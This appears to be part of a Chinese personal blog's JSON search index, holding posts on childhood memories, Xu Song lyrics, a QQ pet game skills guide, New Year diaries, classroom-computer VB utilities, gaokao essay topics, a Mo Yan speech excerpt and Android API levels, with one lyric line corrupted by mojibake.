吃一毛钱的辣条，喝一毛钱一袋的冰水 天天都是脏兮兮的，袖口总是油光可鉴，每天自己都纳闷自己的手哪来那么脏， 永远不会有无聊的时候，总是有做不完的游戏，老鹰抓小鸡，跳皮筋，踢毽子，玩一万遍都不会觉得烦， 最害怕老师，最害怕请家长，最害怕同学说“我告你” 总不会觉得累，总觉得为老师跑腿特光荣， 摔倒了，爬在地上不起来，扯着喉咙大声哭，有时候喊了半天也没出一滴眼泪， 买新衣服了，觉得特骄傲，走路都觉得特气派， 考完试不敢把试卷拿回家，最怕让父母签字，然后偷偷当自己的家长， 在外面受委屈了，哭完再回家，不敢让妈妈看见，（现在我也不知道为什么 自己爱吃的东西，就一次吃好多好多，吃到吐，下次还继续 在家家长说什么都不做，在学校里特勤快，不用老师交待，把一切都做好了 把一张写有“我是乌龟”的纸贴到同学背上， 家里蒸谟，包饺子，总爱帮忙，为的是能玩一回面。 用圆珠笔在手腕上画了个表，还有时间 从来没用完过一块橡皮，要么是丢了，要么是拿小刀切成快了 特别喜欢把手叉米缸里叉来叉去的玩，把米撒的到处都是，开心的嘴都合不住 小时候听我妈说我是从别人家要的，心里就特难受，不知道为什么 最喜欢过年，穿新衣服，满世界乱跑的玩，就是讨厌有一堆作业 最讨厌当初学写自己的名字，我的名字笔画又有点稠，当时心里特憋屈爸妈怎么不给我取个好写的名字， 把课桌当宝，和同桌一尺一寸分，谁都不能过界， 在假期快要开学的前几天拼命的赶作业，胡乱填，胡编个答案，把暑假作业偷偷从中间撕几张， 小时候，一直以为泡面就是像包装纸上的图案一样，那么丰盛的，尤其是红烧牛肉面，我总当做面里是有牛肉的。长大了才发现上面写着，图片仅供参考。 小时候，一放学就要急着把作业做完，然后才玩，长大后，作业一拖再拖，到最终还可能是别人那里弄来的东拼西凑的答案。 小时候，看会儿电视最多九点就睡觉了，现在都要熬到个12点、1点的，对着电脑发呆却迟迟不肯睡觉。 小时候，写联系方式的时候，就是家里的电话，连最要好的几个朋友的电话都会背，现在握着手机，存了那么多，能真正背出号码的又有几人？有时候自己换了个号码都背不出自己的。 小时候，总是希望早早到学校，后来就越拖越晚，甚至希望不要去学校了。 小时候，觉得老师那么神圣，老师的话比父母的话有用的多，现在对老师却有那么多的抱怨， 小时候，愿意有感情的朗读课文，现在课文连看都不想看了。 小时候，有个5块10块就觉得富裕的不得了，能买上各种不同的一大堆东西，大部分都是吃的，吃的里面还送小玩具的那种，1毛钱花哪里了都说的出来。现在有再多也觉得钱不够用，吃的穿的玩的，有时候也不知道花在哪里。 小时候，会集卡片，那种集齐了奖什么什么的，可是总是就差那么两三张。 小时候，每本书都要包个书皮，有时候连作业本也不放过，现在书角卷起来了也不会心疼。 小时候，因为体育不好不能参加班级的集体项目会觉得特别丢人，现在却会偷着乐觉得很轻松。 18岁了，我还是这样一个我，没有太多惊喜。 小时候，以为画了点画就可以成为画家，以为会唱几首歌就可以成为歌唱家，注意是歌唱家。而后才发现没有人欣赏，一切都是白搭。而歌唱家很少，都是明星，艺人，而那些歌唱家唱着我听不懂的东西。 那时候怎么也没想到，长大了湖南卫视会一遍一遍放，从第一部到第三部，不厌其烦。也不知怎么的，当初紫薇尔康五阿哥的，哭的死去活来，现在就当做喜剧来看了。 小时候，去谁家吃饭都一定挑最爱的吃，吃到饱为止，长大了总觉得不在家里就不自在，总是先扒几口饭，再吃些离自己最近的菜。 小时候，我以为人与人之间，就是我跟你好和我不跟你好了，结果现在才发现，有喜欢，忍耐，包容，感恩，甚至还有背叛。 小时候，笑着笑着都笑到肚子痛，长大了笑着笑着，怎么就笑出了眼泪。 小时候，牵着我手的那个老人，我以为她不会离开，剩我长大了努力了，她都看不到。 ………………………… 小时候啊，小时候，我们的小时候，好像一样，又好像都不太一样。 小时候啊，小时候，我还有那么多事都来不及记起，来不及诉说。 小时候啊，小时候，你还好吗？你在回忆里冷不冷、冷不冷？ 小时候啊，小时候，我真的爱你，这是成年的我，我爱你，你认得吗？你对我是否满意。 我的小时候，请你告诉我要坚强，我的小时候，我知道只有你没有受过伤，所以只有你才会真正乐观的告诉我 世界可以很美好、而我可以很勇敢。 小时候小时候，我要走了，走到前面去了，我会带一个大大的、温暖的、笑起来像风铃响一样的未来，来看你。 你等我。","link":"/2011/042_2011-01-0910_16/"},{"title":"许嵩的60句感人歌词，道出了学生时代的伤，语出了实在爱情的誓言","text":"1.不是穿上情侣装就可以装情侣，不是天下有情人最后都能在一起。——《情侣装》 2.我叹服你的技巧，把爱情玩转得如此巧妙，在你的心里早已设计好，什么时候把我丢掉。——《叹服》­3.谁爱谁，没错对。喜欢与爱的分别，归属的感觉，怎么划分界限，怎么让你了解。——《爱你卡农》 4.爱情流过的眼泪，从刻骨变得无所谓，那些快乐的零碎是抚慰。——《爱情里的眼泪》 5.我的Angel，你要明白，如果累了就拥抱着我取暖，给你的爱，像古老的帆，一年一年把心海铺满。——《安琪》 6.我害怕你心碎，没人帮你擦眼泪，别离开身边，拥有你我的世界才能完美。——《暗号》 7.花谢的季节悲伤躲在身后，静静体会榻榻米上的温柔，凋谢的向日葵还傻傻等候，也许默默等待我说句挽留。——《北海道花季》 8.孩子说如果爱就请深深爱，可很多事是不由人的，你说这次再见也许再也不见，去老地方把在碰一面。——《不煽情》 9.星星寂寞的好像你的眼睛，一眨一眨就融化我的心，恋爱那么深，好像掉进一口井。亦不错失美丽的风景，没有你的爱情电影怎可能如期上映。——《唱给谁听》 10.他们都说尘世那么美，相守着你爱的那个谁，白发渔樵 老月青山，平平淡淡值得珍贵。——《尘世美》 11.你的城府有多深，我爱的有多蠢，不想再问，也无法去恨，毕竟你是我最爱的人。——《城府》 12.酝酿着的诺言，保存期又有几年。——《单人旅途》 13.内心纠结的对和错，在墙壁上偷偷摸摸，倔强的你很执着，转身不再多说，只剩一场严重的寂寞陪我度过。——《独坐》 14.断桥是否下过雪，又想起你的脸，若是无缘再见，白堤柳帘垂泪好几遍。——《断桥残雪》 15.她只是我的妹妹，妹妹说紫色很有韵味，她只是我的妹妹，我在担心你是否误会，她只是我的妹妹，对这个解释你无所谓，我没有思想准备，看到你身旁还有一位，不知道他是谁。——《多余的解释》 16.画面定格了，心痛了碎了，我们的快乐，被你推翻了，世界盛我一个，我想你也不会再来找我。——《飞蛾》 17.离开你的城市或许你我不再见面就不必想念也不想见面，关于那个日子我会封锁记忆绝口不提。——《分手纪念日》 18.粉色的信笺，盛满我的思念，雪落掌心里面，一转眼化成线，不知不觉爱你已一百天，好想延续到永远。——《粉色信笺》 19.你当时说你很爱我，我偷偷以为是骗我，等我相信了全部，你又说你爱上了他。——《坏孩子》 20.如果我不小心离开了，一定请你自由的。——《幻城》 21.摇篮漾着一个梦躲身后，寂寞心弦弹起的时候，只留我一个人在尽头，你已远走。——《晃晃悠悠》 22.当我发现醒来其实是另一个梦，梦的出口散不开的浓雾太沉重，就算当初声嘶力竭作苦苦的求你留下别走，也没用。——《灰色头像》 23.信手写下几行诗句，最押韵的，竟然是我的叹息。——《静夜思》 24.我不想还哭泣，抹去受伤血迹，你嘴角有隐约笑意，分析不透你的心，我不想还哭泣，看不见的风景，只想藏进你的梦里，看清你。——《看不见的风景》 25.与其痛不如走，我们各向左和右，我们十八岁的凉亭，浪漫的邂逅，还是那个雨后，平静得分手，不奢求做朋友，但渴求此刻停留。——《凉亭》 26.想起那一段的回忆，至少我还能拥有回忆，如果扼守回忆是生命的意义。——《两种悲剧》 27.庐州月光，梨花雨凉，如今的你又在谁的身旁，家乡月光深深烙在我心上，却流不出当年泪光。——《庐州月》 28.玫瑰花的葬礼，埋藏关于愕幕匾洌芯跛致楸裕荒茏砸眩牙蛔∧恪Ｕ娴暮妹览觯翘斓难袒ㄓ辏宜狄⒋┧榛ㄑ笕沟哪恪！睹倒寤ǖ脑崂瘛?br/&gt; 29.花开后花又落，轮回也没结果，苔上雪告诉我，你没归来过。——《南山忆》 30.我从来没有想到的是，这是你我第一次拥抱，带着浅浅笑，你说会陪我一直到老，远离这尘嚣。——《内线》 31.想和你跳超短裙的恰恰，想带你回家见妈妈。——《你若成风》 32.我发着呆用思绪绕过那一秒的深沉，终于明白或许有些事情没有必要再等，沉默的我们分隔在十字路口的那一瞬，北去的候鸟在即将破晓的天空划满伤痕。——《七号公园》 33.我说Vae，你要清醒，别再轻易掉眼泪；我说Vae，是是非非，你要勇敢去面对；我说Vae，该放就放，别让自己那么累。——《浅唱》 34.你离去的那一瞬间，消失的那一刻，黄与绿的混合是青苹果的苦涩。——《青》 35.我在人间彷徨，寻不到你的天堂，东瓶西镜放，恨不能遗忘；又是清明雨上，折菊寄到你身旁，把你最爱的歌来轻轻唱。——《清明雨上》 36.那天午后我站在你家门口，你咬咬嘴唇还是说出了分手，我的挽留和眼泪全够没有用，或许我应该自食这苦果。——《认错》 37.渡口边最后一面洒下了句点，与你若只如初见，何许伤感离别。——《如果当时》 38.墙边斑驳在蔓延，密云遮盖下滴水的屋檐，划出我每日等你的那条弧线，当我品味那种苦叫做离别。——《三潭印月》 39.爱情的电影，散不散都没了关系，一人安静，一人哭泣。——《散场电影》 40.傻瓜都一样，执着在天平中央，对错摆在两旁，不能忘，怎么走都丢了方向，我们都一样。——《傻瓜都一样》 41.电话里的歌声，打动不了心声，想的想的想得太多眼泪一滴都不剩，还只能继续掩饰心声，我戴上耳机调大音量听着忧伤歌声。——《伤声》 42.我不停疯狂寻找你却想逃避，我不停疯狂呼唤你却想放弃，薯片的脆和派的腻代表了极端的你，我无能为力在拥有你，留住你。——《薯片和派》 43.还以为你早就明白，不爱就该大声说出来，让我能够早点释怀，回到最初无伤害状态。——《送你的独白》 44.可是she told me，她丢了电话也不想换新号码，所以我相信，不能不相信，像小说一样的结局。——《她告诉我》 45 没有你的路，我感觉到了孤寂无助。我们的决定，已经变成散去的烟雾。——《Lover》 46.爱从不逗留，只由人坠落或是成熟若是他真的要走，不会理你是不是一无所有。——《爱不留》 47.我想你已经化成天使，张开双翅，是哭着离开的，有太多的不舍，太多不舍，永久成遗憾了。——《天使》 48.多想给我一副威尼斯假面，华丽的忧伤我要赤脚踏过远方的冰霜，任凭风雪如何阻挡至少还有面具上坚挺的鼻梁。——《威尼斯假面》 49.惟爱你，不论一路经历再大暴风雨，我会永远坚定陪着你。——《惟爱你》 50.我很喜欢和你做做伴，听听歌聊聊天就很愉快，我也喜欢上马路乱踩，看完电影去找招牌菜。——《我很喜欢》 51.我想牵着你的手，逃离这颗星球，剥落了忧愁，快乐就在十指相扣。——《我想牵着你的手》 52.我想你知道夏天的味道，刻在我心里永远抹不掉，就请你给我最后的讯号，我会安静地走掉不打扰，昨天的拥抱今天很需要，你给我的好戒也戒不掉，哭湿枕头套夜晚的煎熬，你的城堡我住在地牢。——《夏天的味道》 53.星座书上说我们不合，最后我偷偷把那页撕掉，真的爱情没法预料，何不让你知道，就算你早知道。——《星座书上》 54.守着今天没有永远，我的泪你不会发现。——《雪花谣》 55.翻腾旋转的烟又陪伴了一整夜，多年不见的画面丢在昨天很抱歉，眼泪要诱惑双眼去寻找风的誓言，裹夹无尽的碎片盘旋一年年。——《寻风》 56.伊人怎会恃宠而骄，凭栏左网把君找。——《烟花笑》 57.为你唱着首歌，没有什么风格，它仅仅代表着，我希望你快乐为你辗转反则，为你放弃世界有何不可。——《有何不可》 58.我承认爱情曾浮现，只是你看不见在这瞬间。——《又小雪》 59.你是我最心疼的甜蜜，痛过的心像玻璃消失的爱已远离。——《最心疼的甜蜜》 60.当陌生的黎明悄悄来临，我已经开始依赖熟悉的梦境，说不定哪天能在耳边听到你声音。——《渲染离别》","link":"/2011/043_2011-01-0223_07/"},{"title":"Q宠大乐斗技能说明以及分析","text":"【百度上淘来哒～和大家分享】 今天我把q宠大乐斗技能说明以及分析拿出来和大家分享一下，有不对的地方希望大家多多包容： 1、首先四大无耻技能..属性技…如果前期你凑齐了..首先恭喜你主动经验会得的很爽..其次默哀吧…被动只要不是有被虐倾向的..一般不鸟你的..ps：最近喜欢自虐的人不少= =! ①天生大力：没改前加成属性是80%….改了后下降大概可能也许加成75%左右…后期王牌技能..秒杀必备~ps：对“天旋地转”有伤害加成 ②身手敏捷：加成同上。最悲剧以及天天被骂的技能..是四大属性技里最受非议的一个…具体原因..敏捷闪避太看rp了…40敏捷闪避如果40%..闪避不见得比10敏捷的出的多..一场乐斗几回合体现不出来..当然你能斗上100回合效果肯定十分明显….建议把敏捷跟防御联系起来…要不继续被骂…ps：额外对“企鹅挠痒”和“天使之翼”有加成。 ③快人一步：加成同上。最受欢迎的属性技，速度高出手多胜率高几乎是定律，几个号比较下来有这技能的胜率都在70%以上…其中一个从未下过90%…(和同级乐斗..找高10+乐斗的自虐人士让道)。不过个人分析后期的话大家属性都提高…出手次数影响应该就不明显。比如20速度打10速度很明显前者出手多…后期40+速度对30+…虽然属性高10点..就不太可能出现前者连打2、3次后者都不出手的情况..所以个人猜想..速度影响出手可能按比值算..比如20对5就是出手4次对1次. ..后期属性高了速度40比30出手就4比3次~效果小多了…ps：前期杀人越货必备…再没领悟前千万记得低调… ④均衡发展：没改之前属性加成30%，改了后貌似25%左右。单独一个效果不是很明显…和上面三个属性技配合就逆天了….整体属性增加100%左右…ps：没领悟的每天来论坛拜..g..m..拜啊拜就领悟了 2、其次三大人品技..可以说如果你照照镜子自认很帅…哪怕你只有1级有了其中一个技能也能干翻40级的..乐斗赢了不算什么..想赢的无比猥琐吗..想让对手心理崩溃吗..毫不犹豫的领悟吧.. ①神来一击：等级再高..皮再厚..中此招者生不如死..留一点血给你躲角落画圈圈去..ps：被“大海无量”克制…rp不好者自重..否则被反死别哭.. ②胶水：也是看rp的东东..有可能一场乐斗一次不出..也有可能粘到对方内分泌失调..精神崩溃..直接导致郁郁而终….ps：咳咳..不准动..乖乖站好..我会好好疼爱你的..无限y笑中 ③企鹅吼：曾经我以为这是个废技..自从我被个7级小号连吼7下最后被一板砖送去见上帝后我深深的感受到了..这是废技吗?不…这是神技…内牛满面..ps：100%忽略一回合，如果出现了相当于你白打对方15点血，如果连续出现… 3、四大小强技能…也许你没有犀利的武器..也许你也没有逆天的属性…但别灰心..把这四技能领回家吧..记得以后乐斗心中默念…你打不死我你打不死我…. ①强健身躯：对hp加成…至于加成多少(十分尴尬没一个号领悟的，谁知道的补充)..血牛必备..乐斗血真的少的可怜..这个技能没领悟后期很吃亏..ps：由于乐斗属性加成什么斗按百分比加的..所以越到后期…这技能越重要… ②霸气护体：有两次机会减伤50%..效果不明显..不过怎么也算个保命技能..对手攻击低的话这技能很鸡肋..如果遇到高力量的..效果就很可观了.. ③皮糙肉厚：减少10%伤害….这个技能我个人觉的…很残废…对手攻击造成50点伤害才减少5点…效果几乎可以无视…不过好在被动每次斗减..积累起来聊胜于无… ④灵活步伐：我闪我闪我闪闪闪…增加7%闪避..很奇怪的一点..闪避不是看rp么..可我有这技能的号明显比没有的能闪多了…算是个不错的被动技能了.. 4、三大伤害加成技能…如果你有一堆的武器而技能惨不忍睹..那么两个武器技能..可是你生存的根本…如果你的武器少的可怜..那么最后个空手技能则是你的不二选择… ①武器好手：30%的伤害加成…本来这技能很废..后来给改了提高伤害加成..一下咸鱼翻身身价百倍了… ②惯用重物：10%大型武器伤害加成…虽然加成少..但大型武器攻击本身就高..配合武器好手秒杀就是这么简单…. ③武术好手：空手伤害增加20%…这技能在后期效果就十分有限了..因为后期大家武器多..伤害也高…一般几回合就结束..武器可能都用不完..更别说空手对殴了…算是前期优势技能… 5、两大被动攻击技…pk必备良技.. ①第六感：30%攻击反击…有这个技能可以大幅度抵消pk高速对手的劣势…给广大低速企鹅一个光明的前程…ps：来打我来打我尽情的揉虐我吧..自残必备技能… ②无影手：20%连续攻击..跟三叉绝配..如果拿起三叉又出无影手…对手只能泪奔了…20%的触发几率也不算低…绝对杀人越货必备良技能..ps：买一送一..就这么实惠.. 6、绝对残废技…好吧..我承认..我完全不知道这技能是干什么用的… ①残影：别称“残废”技如其名..无比的残..不但完全看不出那10%的伤害加成..而且我始终不理解基础速度提高50%什么意思..因为残影后根本每看出什么速度优势..该咋样还是咋样..听说有bug..后来修改了..可悲剧的是修改了貌似没效果..更无语的是出了这技能抛投的武器次数都从2次变成1次…所以..毫不犹豫的“废技” 7、三大神技能..每个人的追求..每个人的梦想.. ①神之大海无量：想想吧..当你极度兴奋的一个神来出手看着对手一点血..然后被一个大海反死..感觉如何..是否飘飘欲仙..毫无疑问..有了大海..一切皆有可能..ps：打我是要付出代价的… ②神之势如暴雨：华丽的秒杀..当你才刚兴奋的上场..突觉眼前一亮..三道白光闪过..于是 ..可怜的鹅鹅们哭着说..我还没摆好poss呢…ps：武器多多..买一送二大优惠啊… ③神之装死：好吧..其实我更愿意 称它为..赖皮技..无数次的经典..都是装死发挥它那耀眼的光芒..它深刻的提醒我们 ..hp没到0前..只要你敢笑..它就敢让你哭..ps：很无赖的一点..你把hp打到1点..如果有装死..下次攻击中还是1点..有没崩溃的感觉… 8、五大半残主动技能..很尴尬的存在..因为发动几率的问题..几乎宣告了他们成为废技..至于废在哪..小小解析下..如有不同意见..欢迎提出.. ①晴天霹雳：这技能伤害算法…15+等级x1.5…..曾经我无限yy中..如果80j不是一下135了..秒杀啊..后来我才尴尬的发现…80j血绝对不会是可怜西西的100多..80j一个武器砸出去都不只这伤害..这就造成了这技能无奈的地方..前期伤害太低还比不上一武器..后期伤害高了可武器力量加成伤害更高..还是 比不过武器 .. ②天旋地转：伤害 算法…20+80%x力量…也是尴尬技能 ..伤害跟力量挂钩..如果你有50力量..那一下可以造成60伤害..不过你想想…50力量空手敲下都不只60伤害了吧… ③天使之翼：伤害 算法…15+100%x敏捷 …不会被反击和按敏捷计算伤害算是一个小小亮点..适合高敏低力宝宝 ..给敏捷企鹅提供个小小的输出..ps：这技能可以在被胶水的情况下用出..人品无限胶水流的克星..让你粘我..我飞天神鹅.. ④蓄力一击：那35点伤害..前期很开心..后期 ..是不是有点想哭的冲动 ? ⑤企鹅挠痒：6回合的持续伤害….伤害实在有限..同样和敏捷挂钩..给悲剧的高敏企鹅一条活路.. 9、黄钻专署技能…华丽的显摆技能… ①黑龙波：蓄力一击的加强版…所以面对同样尴尬..前期很犀利 …额..后期么 …后期很好看… 10、打劫技能..武器少的..就去抢吧… ①缴械：(修改..50%抢到对方武器…发动几率不明..如果是这样..后期这技能就比较残了…自己武器都用不完还抢别人的…不过人品来了抢个水枪啊、死神啊、三X等给对手来一下还是很刺激的)………………ps：善良的企鹅不抢人东西..纯洁滴孩子华丽的无视吧… 11、治疗技..作为唯一一个作用在自身上的主动技能..可以说效果很优秀..也可以说应该华丽的无视..为什么类..听我一一说来… ①矿泉水：技能说明里表示可以恢复25%hp…并且马上攻击 ..这说明喝水不占出手次数..这无疑十分优秀..但说明里没说清楚一点..那就是一场乐斗可以用几次这技能..如果没限制..想想..rp大**连灌几口水..是不是很让人崩溃…好吧这只是个人无限yy中..反正我只见过一次乐斗喝一次的…所以 这技能应该是有限制次数。","link":"/2011/044_2011-01-0116_52/"},{"title":"再见！2010","text":"2011年01月01日 周六 多云­ 2010，即将再见。遇见谁，告别谁？经历什么，错过什么……那些即将结束的和即将开始的….解脱还是期待？­ 2011，已经开始。这一年，我的前途？命运？未来？似乎已近在咫尺，却又不可预料。­ 回忆2010，我们曾经共同走过初二的美好时光。这一年，我相信我的每一位同学都感受到了自己的成长。青春期的思想令人难以琢磨。但是我也不希望整天看着大家目光呆滞面如土灰气若游丝行尸走肉对哈？这一年我也在努力地改变性格……似乎有些晚……其实我小学的时候脾气很不好，又局于自己糟糕的语言表达能力，所以经常发怒。嘿嘿，上了初中才懂得了一点人际交往。很佩服杨老师。。同学开点玩笑，老师多半是迎合着我们的意愿——可是为什么每次接近她都会浑身发抖呢？ o(≧v≦)o~~­ 展望2011，今年我们就要毕业乐【提到这个就寒心….做毕业纪念册木人给我提供点素材哪】，毕业就等于同学们会分开……我会想念大家的！不过没关系，我们失去的同时，要仔细想想，我们同时也得到了什么不是吗？­ 最后，还是那句话——­ Happy New Year 2011!!!­ To wish you joy at this holy season. Wishing every happiness will always be with you!­ And BEST wishes for passing the examination!­ By:麦咕 iMaeGoo_­","link":"/2011/045_2011-01-0112_08/"},{"title":"无题","text":"眼睛保健操，，（→_→)?(↑_?↑)?(←_←)?(↓_↓)?(→_→) (↑_↑) (←_←)?(←_←)?(↑_↑)?(→_→)?(↑_↑)?(←_←)?(↓_↓)(→_→)做完之后可能出现如下症状：?(?T_T?)（＞_＜）?(?*_*?)?……眼保健操加强版：?(↑_↓)?(←_→)(↓_↑)?(→_←)(↑_↓)?(←_→)(↓_↑)?(→_←)(↑_↓)?(←_→)做完之后可能出现如下症状：?(O_O)?(V_V)（★_★）(⊙_⊙)……眼睛保健操终极版：?(↗_↗)?(↙_↙)?(↗_↖)?(↖_↗)?(↖_→)?(↙_↑)?(↓_↖)?(↓_→)?(↘_↘)?(↖_↖)?(↓_→)?(↖_→)?(↙_↑)?(←_↗?(↓_↘)?(↖_→)做完后将出现以下症状：(?_?)(*_▲)?(▲_*)并最终修炼出万花筒写轮眼！","link":"/2012/010_2012-06-2310_27/"},{"title":"2012-9-8","text":"茫茫宇宙中，有一种神奇的生物，这种生物不玩游戏，不聊qq，天天就知道学习，回回年级第一。这种生物可以九门功课同步学，妈妈再也不用担心他的学习了。。这种生物叫做别人家孩子。。 这种生物考清华，望北大，能考硕士，博士，圣斗士，还能升级黄金，白金，和水晶级。他不看星座，不看漫画，看到电脑就想骂娘。。。他是团员、党员、公务员，将来还可能知道地球为什么这么圆。这种生物长得好看，写字好看，成绩单也好看，就连他的手指甲都是双眼皮的。。。这种生物每天只花1块钱都觉得奢侈浪费和犯罪，这就是感动中国2011，十大人物之——别人家孩子= =","link":"/2012/009_2012-09-0808_20/"},{"title":"你好，January 1st 2012","text":"首先，祝大家新年快乐，祝可爱的童鞋们在快乐的基础之（虚词学到这地步了？）上学习进步，各位网友事业有成，家庭和睦！别忘了请我喝粥哇！iMaeGoo_2011关键词×5——【毕业，微日记，What’s Style?，第一次上台演出，潜水】2011竟然是如此短暂，其实也不足为怪的。伴随着我们又长大了一岁，伴随着初升高的喜悦（某些人），伴随着同学别离的笙箫，伴随着“小月月”“小悦悦”的相继走红（点背啊，高中同学居然如此称呼我，虽然比初中的好听点，但总觉得不那么亲切了，真的），伴随着S60的停止更新（迫使我放弃了Carbide C++），伴随着昨日还响个不停的爪机。没错，2011就这么过去，或许辛酸大于快乐，或否，我们都将迎来崭新的末日之年。（门外的电视哀乐播放ing）这才体会到高中竟是如此地黑暗（还是那句话。。。）。不说无双休无节假无寒假，连初中暑假都要占据哇::&gt;_&lt;::更恐怖的是那群勤奋的学子们，联欢会都要带上课本，我瞬间被秒杀了……那时候觉得八中可以说是我待过的最幸福的地方，而现在失去了，就不复返了。（哀乐停）几十小时前好多人还沉浸在联欢会的喜悦之中，相反，我更想独自搞定九中那群二二的后台人员（参考我的说说）！元旦晚会就没什么好说的了，对于我这种歌盲……我更喜欢戴上耳机听Bandari的声音。你们终于抹杀了我11年最后一次潜水上浮的机会。欣赏同学们那些很是伤感的短信说说日志，很难回复，于是将新年快乐藏在剪切板，一夜之间笔键（粘贴用的）被我按得粘糊糊的。其实又何必呢，节日不是轮到伤心的时候。三班没有随着2011的逝去而消失！别说2012，就是2112，我们，还能在天堂，相聚。你好！2012！新的一年！新的开始！现实主义从不眷恋于昨日！And三班明天更美好！PS：以后聚会我会经常缺席的，那补课是潮水一般……但我将永远念你们！ ——Forever Love Class 3 的 Mae2012年元月1日上午，于家中","link":"/2012/013_2012-01-0111_20/"},{"title":"［VB］班班通专用自动关机小程序","text":"源码+程序下载地址：http://pan.baidu.com/share/link?shareid=134826&amp;uk=587368294","link":"/2012/blog_68cc06bd01019s5u/"},{"title":"［VB］［2012.12.15］班班通助手v1.5末日狂欢","text":"警告：非班班通电脑勿用！会导致系统不稳定！ 下载地址：http://pan.baidu.com/share/link?shareid=134832&amp;uk=587368294","link":"/2012/blog_68cc06bd01019s5y/"},{"title":"2013高考作文（更新完毕）","text":"转自新浪：http://edu.sina.com.cn/gaokao/2013-06-07/1141383023.shtml 全国卷 真诚与友善新课标卷 经验与勇气北京卷 爱迪生怎么看手机上海卷 更重要的事江苏卷 探险者与蝴蝶福建卷 根据《忧天》写作文湖南卷 我愿意 材料作文，二选一辽宁卷 沙子和珍珠广东卷 以“捐助”为题作文山东卷 以“莫言”为材料自拟标题安徽卷 为什么能或不能这样重庆卷 根据大豆写作文湖北卷 上善若水任方圆天津卷 ___而知之不断更新：四川卷 过一个平衡的生活江西卷 学生有三怕广西卷 捡到手机之后浙江卷 三句话看青春","link":"/2013/005_2013-06-0712_39/"},{"title":"［VB］班班通专用自动白板+全屏+选择黑色","text":"很实用的一个小程序，配合远程控制效果更好！软件通过Shell和模拟鼠标来实现白板的启动。So…请将白板上的工具栏放在屏幕右上角并保存！否则。。。就点不准了。。。软件启动后无界面，执行完任务后会自动关闭，不占内存的。 源码+程序下载地址：http://pan.baidu.com/share/link?shareid=134846&amp;uk=587368294","link":"/2012/blog_68cc06bd01019s62/"},{"title":"学生查询期末考试个人成绩报告及各学科分析结果流程","text":"学生查询期末考试个人成绩报告及各学科分析结果流程：1、登录“郑州教育信息网”（http://www.zzedu.net.cn/）在“快速通道”栏目中点击“数据分析平台”；2、点击“高二年级期末考试数据分析”，进入考生登录界面，学生输入考号、密码和验证码即可进入查询页面，可以查询整体报告和各学科卷面分析报告，页面上方向右的箭头可以翻页。","link":"/2013/007_2013-02-0320_54/"},{"title":"莫言获奖感言片段，有兴趣的看看","text":"本来想把全文粘上去，太长了，限5000字，喜欢的自己去看吧——http://u.sanwen.net/subject/1007805.html—————— 我获得诺贝尔文学奖后，引发了一些争议。起初，我还以为大家争议的对象是我，渐渐地，我感到这个被争议的对象，是一个与我毫不相关的人。我如同一个看戏人，看着众人的表演。我看到那个得奖人身上落满了花朵，也被掷上了石块，泼上了污水，我生怕他被打垮，但他微笑着从花朵和石块中钻出来，擦干净身上的脏水，坦然地站在一边，对着众人说。对一个作家来说，最好的说话方式是写作。我该说的话都写进了我的作品里，用嘴说出的话随风而散，用笔写出的话永不磨灭。我希望你们能耐心地读一下我的书。即便你们读了我的书，我也不期望你们能改变我的看法，世界上还没有一个作家，能让所有的读者都喜欢他。在当今这样的时代里，更是如此。尽管我什么都不想说，但在今天这样的场合我必须说话，那我就简单地再说几句。我是一个讲故事的人，我还是要给你们讲故事。上世纪六十年代，学校里组织我们去参观一个苦难展览，我们在老师的引领下放声大哭，为了能让老师看到我的表现，我舍不得擦去脸上的泪水，我看到有几位同学悄悄地将唾沫抹到脸上冒充泪水，我还看到在一片真哭假哭的同学之间，有一位同学，脸上没有一滴泪，嘴巴里没有一点声音，也没有用手掩面，他睁着眼看着我们，眼睛里流露出惊讶或者是困惑的神情。事后，我向老师报告了这位同学的行为。为此，学校给了这位同学一个警告处分。多年之后，当我因自己的告密向老师忏悔时，老师说，那天来找他说这件事的，有十几个同学。这位同学十几年前就已去世，每当想起他，我就深感歉疚，这件事让我悟到一个道理，那就是：当众人都哭时，应该允许有的人不哭，当哭成为一种表演时，更应该允许有的人不哭。我再讲一个故事：三十多年前，我还在部队工作，有一天晚上，我在办公室看书，有一位老长官推门进来，看了一眼我对面的位置，自言自语道：“噢，没有人？”我随即站起来，高声说：“难道说我不是人吗？”那位老长官被我顶得面红耳赤，尴尬而退，为此事，我洋洋得意了许久，以为自己是个英勇的斗士，但事过多年后，我却为此深感内疚。请允许我讲最后一个故事，这是许多年前我爷爷讲给我听过的：有八个外出打工的泥瓦匠，为避一场暴风雨，躲进了一座破庙，外边的雷声一阵紧似一阵，一个个的火球，在庙门外滚来滚去，空中似乎还有吱吱的龙叫声，众人都胆战心惊，面如土色，有一个人说：“我们八个人中，必定一个人干过伤天害理的坏事，谁干过坏事，就自己走出庙接受惩罚吧，免得让好人受到牵连。”自然没有人愿意出去，又有人提议道：“既然大家都不想出去，那我们就将自己的草帽往外抛吧，谁的草帽被刮出庙门，就说明谁干了坏事，那就请他出去接受惩罚。”于是大家就将自己的草帽往庙门外抛，七个人的草帽被刮回了庙内，只有一个人的草帽被卷了出去，大家就催这个人出去受罚，他自然不愿出去，众人便将他抬起来扔出了庙门，故事的结局我估计大家都猜到了那个人刚被扔出庙门，那座破庙轰然坍塌。我是一个讲故事的人。因为讲故事我获得了诺贝尔文学奖。我获奖后发生了很多精彩的故事，这些故事，让我坚信真理和正义是存在的。今后的岁月里，我将继续讲我的故事。谢谢大家！","link":"/2013/008_2013-01-2322_49/"},{"title":"丢失的记忆","text":"2014 ~ 2018 大学期间，我开通了 maego.cc 用于当时的虹墨空间站的建设，使用了 Typecho 框架和 JianShu 主题，但遗憾的是，由于数据库已经丢失，这部分博客文章永远消失了，只留下了这些文章插图……","link":"/2016/lost/"},{"title":"Android版本 (1.0~14.0) 与API Level (SDK版本1~34) 对应表","text":"什么是 API 级别？API 级别是一个对 Android 平台版本提供的框架 API 修订版进行唯一标识的整数值。 Android 平台提供了一种框架 API，应用可利用它与底层 Android 系统进行交互。 该框架 API 由以下部分组成： 一组核心软件包和类 一组用于声明清单文件的 XML 元素和属性 一组用于声明和访问资源的 XML 元素和属性 一组 Intent 一组应用可请求的权限，以及系统中包括的权限强制执行。 每个后续版本的 Android 平台均可包括对其提供的 Android 应用框架 API 的更新。 框架 API 更新的设计用途是使新 API 与早期版本的 API 保持兼容。 也就是说，大多数 API 更改都是新增更改，会引入新功能或替代功能。 在 API 的某些部分得到升级时，旧版的被替换部分将被弃用，但不会被移除，这样现有应用仍可使用它们。 在极少数情况下，可能会修改或移除 API 的某些部分，但通常只有在为了确保 API 稳健性以及应用或系统安全性时，才需要进行此类更改。 